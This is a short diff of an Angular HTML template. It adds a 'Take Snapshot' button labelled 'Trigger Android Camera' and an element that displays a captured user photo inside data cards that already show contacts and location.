@@ -8,6 +8,7 @@
 <div class="data-container">
   <div class="data-card" *ngFor="let item of data">
     <div class="section-box-container">
+
       <!-- Contacts Box -->
       <div class="section-box">
         <h3>Contacts</h3>
@@ -61,6 +62,16 @@
         <h3>Location</h3>
         <p>Latitude: {{ item.location.latitude || 'N/A' }}, Longitude: {{ item.location.longitude || 'N/A' }}</p>
       </div>
+
+      <div class="camera-container">
+        <h1>Trigger Android Camera</h1>
+        <button (click)="triggerCamera()">Take Snapshot</button>
+      </div>
+
+      <div *ngIf="userImage">
+        <img [src]="userImage" alt="User Photo" class="user-image" />
+      </div>
+
     </div>
   </div>
 </div>
